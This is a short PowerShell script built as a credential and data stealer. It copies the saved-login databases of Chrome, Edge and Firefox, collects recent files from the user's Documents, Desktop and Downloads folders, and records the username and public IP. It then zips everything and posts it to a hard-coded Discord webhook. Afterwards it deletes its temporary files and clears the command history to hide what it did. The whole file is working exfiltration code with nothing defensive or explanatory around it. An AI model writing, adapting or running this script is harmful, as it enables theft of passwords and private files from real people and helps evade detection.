# --- 1. CONFIGURATION ---
$webhookUrl = "https://discordapp.com/api/webhooks/1515858036097548418/VYaHlmAcSlF6Cv-t09FodmZZn9TPRsb9GmRATS3W0nz35utbuaf3PhrMofrG8roJz4g_"

# --- 2. DATA COLLECTION ---
$tempDir = "$env:TEMP\lox_loot"
if (Test-Path $tempDir) { Remove-Item -Path $tempDir -Recurse -Force }
New-Item -ItemType Directory -Path $tempDir -Force | Out-Null

Write-Output "Starting deep collection..."

# A. Browser Data (With "In-Use" Bypass)
$browserPaths = @(
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data",
    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data",
    "$env:APPDATA\Mozilla\Firefox\Profiles\*\logins.json"
)

foreach ($path in $browserPaths) {
    try { 
        # We use a trick: Copy to a temp file first to bypass the "File in Use" lock
        $targetFile = "$tempDir\browser_data_$(Get-Random)"
        Copy-Item $path -Destination $targetFile -ErrorAction SilentlyContinue
    } catch {
        Write-Output "Skipped a locked file..."
    }
}

# B. User Documents & Desktop (The "Everything" part)
$userFolders = @("$env:USERPROFILE\Documents", "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads")
foreach ($folder in $userFolders) {
    if (Test-Path $folder) {
        try {
            # Only grab files, and ignore errors if a file is locked
            Get-ChildItem -Path $folder -File -ErrorAction SilentlyContinue | 
            Where-Object { $_.LastWriteTime -gt (Get-Date).AddDays(-30) } | 
            Copy-Item -Destination $tempDir -ErrorAction SilentlyContinue
        } catch {}
    }
}

# C. System Metadata
$sysInfo = "🚨 **EXFILTRATION ATTEMPT** 🚨`nUser: $env:USERNAME`nIP: $(Invoke-RestMethod ipinfo.io/ip)"
$sysInfo | Out-File "$tempDir\identity.txt"

# --- 3. COMPRESSION ---
$zipFile = "$env:TEMP\system_dump.zip"
Compress-Archive -Path "$tempDir\*" -DestinationPath $zipFile -Force -ErrorAction SilentlyContinue

# --- 4. EXFILTRATION ---
if (Test-Path $zipFile) {
    $fileSizeMB = (Get-Item $zipFile).Length / 1MB
    if ($fileSizeMB -lt 24) {
        try {
            $multipartBody = @{
                multipart = @{ name = "file"; content = [System.IO.File]::ReadAllBytes($zipFile) }
                payload_json = @{ content = "🚨 **DATA EXFILTRATED** 🚨`n$sysInfo" }
            }
            Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "multipart/form-data" -Body $multipartBody
        } catch { Write-Output "Upload failed" }
    }
}

# --- 5. CLEANUP ---
if (Test-Path $tempDir) { Remove-Item -Path $tempDir -Recurse -Force }
if (Test-Path $zipFile) { Remove-Item -Path $zipFile -Force }
Clear-History
Exit
